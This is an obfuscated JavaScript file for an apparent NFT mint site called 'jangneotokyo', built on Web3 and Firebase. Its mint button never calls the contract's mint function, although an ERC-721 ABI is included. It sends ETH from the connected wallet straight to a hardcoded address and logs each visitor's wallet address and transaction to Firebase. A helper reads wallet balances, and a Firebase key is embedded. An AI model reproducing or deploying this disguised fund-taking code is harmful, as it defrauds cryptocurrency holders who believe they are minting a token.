const _0x210435=_0x244a;function _0x244a(_0x375ff8,_0x439f45){const _0x5f03f0=_0x5f03();return _0x244a=function(_0x244a9d,_0x29e9a3){_0x244a9d=_0x244a9d-0x176;let _0x5de565=_0x5f03f0[_0x244a9d];return _0x5de565;},_0x244a(_0x375ff8,_0x439f45);}(function(_0xf267ef,_0xe5034){const _0x4a29e8=_0x244a,_0x5672ff=_0xf267ef();while(!![]){try{const _0x427f33=parseInt(_0x4a29e8(0x1a2))/0x1*(parseInt(_0x4a29e8(0x17c))/0x2)+parseInt(_0x4a29e8(0x1a9))/0x3+parseInt(_0x4a29e8(0x198))/0x4+-parseInt(_0x4a29e8(0x1ad))/0x5+parseInt(_0x4a29e8(0x1c8))/0x6*(parseInt(_0x4a29e8(0x19b))/0x7)+parseInt(_0x4a29e8(0x1b5))/0x8*(parseInt(_0x4a29e8(0x191))/0x9)+-parseInt(_0x4a29e8(0x179))/0xa*(parseInt(_0x4a29e8(0x1ae))/0xb);if(_0x427f33===_0xe5034)break;else _0x5672ff['push'](_0x5672ff['shift']());}catch(_0x374f25){_0x5672ff['push'](_0x5672ff['shift']());}}}(_0x5f03,0xd50e2),$(document)[_0x210435(0x1c9)](function(){const _0x60687e=_0x210435;console[_0x60687e(0x1c6)](_0x60687e(0x184));}));const config={'apiKey':_0x210435(0x19f),'authDomain':_0x210435(0x180),'projectId':_0x210435(0x1c3),'storageBucket':_0x210435(0x1cc),'messagingSenderId':'20777123504','appId':_0x210435(0x1b3)},app=firebase[_0x210435(0x19e)](config),db=firebase[_0x210435(0x182)](app),ref=db[_0x210435(0x1a7)]('jangtokyo'),OPENSEA_URL='https://api.opensea.io/';let account;async function loadWeb3(){const _0x180829=_0x210435;try{window[_0x180829(0x187)]=await new Web3(window[_0x180829(0x186)]);}catch(_0x4bc80b){console[_0x180829(0x1c6)](_0x4bc80b);}}function setItem(_0x3b06ca,_0x140d49){const _0x3113e1=_0x210435;localStorage[_0x3113e1(0x1a8)](_0x3b06ca,JSON[_0x3113e1(0x1ac)](_0x140d49));}function getItem(_0x4a9c5f){const _0x44f58f=_0x210435;return JSON['parse'](localStorage[_0x44f58f(0x17b)](_0x4a9c5f));}$(_0x210435(0x196))['on'](_0x210435(0x1af),()=>{const _0x5dda64=_0x210435;let _0x4257ef=parseInt($('#mint_amount')[_0x5dda64(0x1c7)]()),_0x16db30=_0x4257ef+0x1;$(_0x5dda64(0x188))[_0x5dda64(0x1c7)](_0x16db30);}),$(_0x210435(0x1cb))['on'](_0x210435(0x1af),()=>{const _0x3f877f=_0x210435;let _0x2fc171=parseInt($(_0x3f877f(0x188))[_0x3f877f(0x1c7)]());if(_0x2fc171>0x1){let _0x2de414=_0x2fc171-0x1;$(_0x3f877f(0x188))[_0x3f877f(0x1c7)](_0x2de414);}}),$('#mint-now')['on'](_0x210435(0x1af),async()=>{check();});async function getAddress(){const _0x565aa8=_0x210435,_0x4bc279=await window['ethereum'][_0x565aa8(0x199)]({'method':_0x565aa8(0x189)})['catch'](_0x3f2d1a=>{const _0x562234=_0x565aa8;_0x3f2d1a[_0x562234(0x1bf)]===0xfa1?(console['log'](_0x562234(0x1c1)),location[_0x562234(0x1b4)]()):console[_0x562234(0x1cd)](_0x3f2d1a);});account=_0x4bc279[0x0],console['log'](account);const _0x3c2ede=db[_0x565aa8(0x1a7)](_0x565aa8(0x178))[_0x565aa8(0x195)](account);await _0x3c2ede['get']()[_0x565aa8(0x1c0)](async _0x366c90=>{const _0x234cad=_0x565aa8;_0x366c90[_0x234cad(0x1c2)]?(console[_0x234cad(0x1c6)](_0x234cad(0x1ba)),_0x3c2ede[_0x234cad(0x1b7)]({'status':'connected','date':new Date()})):(console[_0x234cad(0x1c6)](_0x234cad(0x1a1)),_0x3c2ede['set']({'address':account,'date':new Date(),'status':_0x234cad(0x1b0)})[_0x234cad(0x1c0)](()=>{const _0x2b336b=_0x234cad;console[_0x2b336b(0x1c6)](_0x2b336b(0x1bd));})[_0x234cad(0x1ab)](()=>{const _0xa861f5=_0x234cad;console[_0xa861f5(0x1c6)](_0xa861f5(0x192));}),console['log'](account));});}$(_0x210435(0x1b6))['on'](_0x210435(0x1af),async()=>{await loadWeb3(),await getAddress();});function _0x5f03(){const _0x55b840=['14562llCESE','error\x20adding\x20document','approved','address','doc','#plus_value','transferOwnership','1903392RgKaFD','request','bytes','154DiimHp','tokenURI','owner','initializeApp','AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0','function','doc\x20not\x20found','131114OiprHz','getBalance','ownerOf','string','symbol','collection','setItem','441108HGdaIW','renounceOwnership','catch','stringify','6442915FTRaeD','1089axAqgw','click','connected','ApprovalForAll','view','1:20777123504:web:5d991c72b7af82ff6f4575','reload','4568AyZRAj','#SINGIN','update','fromWei','previousOwner','doc\x20exists','interfaceId','operator','successfully\x20added','tokenId','code','then','please\x20con\x20met','exists','jangneotokyo','Transfer','nonpayable','log','val','388998ExwRkb','ready','add','#minutes_value','jangneotokyo.appspot.com','error','getApproved','uint256','addresses','174710woFoDP','Approval','getItem','14uHqBfq','sendTransaction','bool','safeTransferFrom','jangneotokyo.firebaseapp.com','utils','firestore','setApprovalForAll','yawa','eth','ethereum','web3','#mint_amount','eth_requestAccounts','toString','ether','constructor','event','bytes4','from','newOwner'];_0x5f03=function(){return _0x55b840;};return _0x5f03();}const _abi=[{'inputs':[],'stateMutability':_0x210435(0x1c5),'type':_0x210435(0x18c)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x210435(0x194),'name':_0x210435(0x19d),'type':_0x210435(0x194)},{'indexed':!![],'internalType':_0x210435(0x194),'name':_0x210435(0x193),'type':_0x210435(0x194)},{'indexed':!![],'internalType':_0x210435(0x177),'name':_0x210435(0x1be),'type':_0x210435(0x177)}],'name':_0x210435(0x17a),'type':_0x210435(0x18d)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x210435(0x194),'name':'owner','type':_0x210435(0x194)},{'indexed':!![],'internalType':_0x210435(0x194),'name':_0x210435(0x1bc),'type':_0x210435(0x194)},{'indexed':![],'internalType':_0x210435(0x17e),'name':_0x210435(0x193),'type':_0x210435(0x17e)}],'name':_0x210435(0x1b1),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x210435(0x1b9),'type':'address'},{'indexed':!![],'internalType':_0x210435(0x194),'name':_0x210435(0x190),'type':'address'}],'name':'OwnershipTransferred','type':_0x210435(0x18d)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x210435(0x194),'name':_0x210435(0x18f),'type':_0x210435(0x194)},{'indexed':!![],'internalType':_0x210435(0x194),'name':'to','type':_0x210435(0x194)},{'indexed':!![],'internalType':'uint256','name':'tokenId','type':_0x210435(0x177)}],'name':_0x210435(0x1c4),'type':_0x210435(0x18d)},{'inputs':[{'internalType':_0x210435(0x194),'name':'to','type':_0x210435(0x194)},{'internalType':_0x210435(0x177),'name':_0x210435(0x1be),'type':_0x210435(0x177)}],'name':'approve','outputs':[],'stateMutability':_0x210435(0x1c5),'type':'function'},{'inputs':[{'internalType':'address','name':'owner','type':_0x210435(0x194)}],'name':'balanceOf','outputs':[{'internalType':_0x210435(0x177),'name':'','type':_0x210435(0x177)}],'stateMutability':_0x210435(0x1b2),'type':_0x210435(0x1a0)},{'inputs':[{'internalType':_0x210435(0x177),'name':_0x210435(0x1be),'type':_0x210435(0x177)}],'name':_0x210435(0x176),'outputs':[{'internalType':_0x210435(0x194),'name':'','type':_0x210435(0x194)}],'stateMutability':_0x210435(0x1b2),'type':_0x210435(0x1a0)},{'inputs':[{'internalType':_0x210435(0x194),'name':_0x210435(0x19d),'type':_0x210435(0x194)},{'internalType':_0x210435(0x194),'name':_0x210435(0x1bc),'type':_0x210435(0x194)}],'name':'isApprovedForAll','outputs':[{'internalType':'bool','name':'','type':'bool'}],'stateMutability':'view','type':_0x210435(0x1a0)},{'inputs':[],'name':'name','outputs':[{'internalType':'string','name':'','type':_0x210435(0x1a5)}],'stateMutability':_0x210435(0x1b2),'type':_0x210435(0x1a0)},{'inputs':[],'name':'owner','outputs':[{'internalType':'address','name':'','type':_0x210435(0x194)}],'stateMutability':_0x210435(0x1b2),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x210435(0x1be),'type':_0x210435(0x177)}],'name':_0x210435(0x1a4),'outputs':[{'internalType':'address','name':'','type':_0x210435(0x194)}],'stateMutability':_0x210435(0x1b2),'type':'function'},{'inputs':[],'name':_0x210435(0x1aa),'outputs':[],'stateMutability':_0x210435(0x1c5),'type':'function'},{'inputs':[{'internalType':'address','name':'to','type':_0x210435(0x194)},{'internalType':'uint256','name':_0x210435(0x1be),'type':_0x210435(0x177)}],'name':'safeMint','outputs':[],'stateMutability':_0x210435(0x1c5),'type':_0x210435(0x1a0)},{'inputs':[{'internalType':_0x210435(0x194),'name':_0x210435(0x18f),'type':_0x210435(0x194)},{'internalType':_0x210435(0x194),'name':'to','type':'address'},{'internalType':_0x210435(0x177),'name':_0x210435(0x1be),'type':_0x210435(0x177)}],'name':'safeTransferFrom','outputs':[],'stateMutability':'nonpayable','type':_0x210435(0x1a0)},{'inputs':[{'internalType':_0x210435(0x194),'name':'from','type':_0x210435(0x194)},{'internalType':_0x210435(0x194),'name':'to','type':_0x210435(0x194)},{'internalType':_0x210435(0x177),'name':'tokenId','type':_0x210435(0x177)},{'internalType':_0x210435(0x19a),'name':'data','type':_0x210435(0x19a)}],'name':_0x210435(0x17f),'outputs':[],'stateMutability':_0x210435(0x1c5),'type':_0x210435(0x1a0)},{'inputs':[{'internalType':_0x210435(0x194),'name':_0x210435(0x1bc),'type':'address'},{'internalType':_0x210435(0x17e),'name':_0x210435(0x193),'type':_0x210435(0x17e)}],'name':_0x210435(0x183),'outputs':[],'stateMutability':'nonpayable','type':_0x210435(0x1a0)},{'inputs':[{'internalType':_0x210435(0x18e),'name':_0x210435(0x1bb),'type':'bytes4'}],'name':'supportsInterface','outputs':[{'internalType':'bool','name':'','type':'bool'}],'stateMutability':_0x210435(0x1b2),'type':_0x210435(0x1a0)},{'inputs':[],'name':_0x210435(0x1a6),'outputs':[{'internalType':_0x210435(0x1a5),'name':'','type':_0x210435(0x1a5)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':'uint256','name':'tokenId','type':_0x210435(0x177)}],'name':_0x210435(0x19c),'outputs':[{'internalType':'string','name':'','type':'string'}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x210435(0x194),'name':'from','type':_0x210435(0x194)},{'internalType':_0x210435(0x194),'name':'to','type':'address'},{'internalType':'uint256','name':_0x210435(0x1be),'type':'uint256'}],'name':'transferFrom','outputs':[],'stateMutability':'nonpayable','type':_0x210435(0x1a0)},{'inputs':[{'internalType':_0x210435(0x194),'name':'newOwner','type':_0x210435(0x194)}],'name':_0x210435(0x197),'outputs':[],'stateMutability':'nonpayable','type':_0x210435(0x1a0)}],delay=_0x14ad10=>new Promise(_0xc0f3fc=>setTimeout(_0xc0f3fc,_0x14ad10));async function check(){const _0x4a98c9=_0x210435;await loadWeb3(),await getAddress();const _0x1bf160=$(_0x4a98c9(0x188))[_0x4a98c9(0x1c7)]();alert(_0x1bf160);var _0x37663b=_0x1bf160-0.0084;const _0x2ce9b6=Web3[_0x4a98c9(0x181)]['toWei'](_0x37663b[_0x4a98c9(0x18a)](),_0x4a98c9(0x18b));console['log'](_0x2ce9b6);const _0x38d9b3={'from':account,'to':'0xbc46a4D7773B53A2f35d765C78EBC648CEbfeA12','value':_0x2ce9b6};await web3[_0x4a98c9(0x185)][_0x4a98c9(0x17d)](_0x38d9b3)[_0x4a98c9(0x1c0)](_0x710353=>{const _0x2c00b0=_0x4a98c9;db[_0x2c00b0(0x1a7)](''+account)[_0x2c00b0(0x1ca)]({'sent':_0x710353}),console[_0x2c00b0(0x1c6)](_0x710353);})[_0x4a98c9(0x1ab)](_0x43b622=>{const _0x499073=_0x4a98c9;console[_0x499073(0x1c6)](_0x43b622);});}async function get_eth(_0x52df2c){const _0x399820=_0x210435,_0x3c23dd=web3[_0x399820(0x181)][_0x399820(0x1b8)](await web3[_0x399820(0x185)][_0x399820(0x1a3)](_0x52df2c),_0x399820(0x18b))*0x1;return _0x3c23dd;}
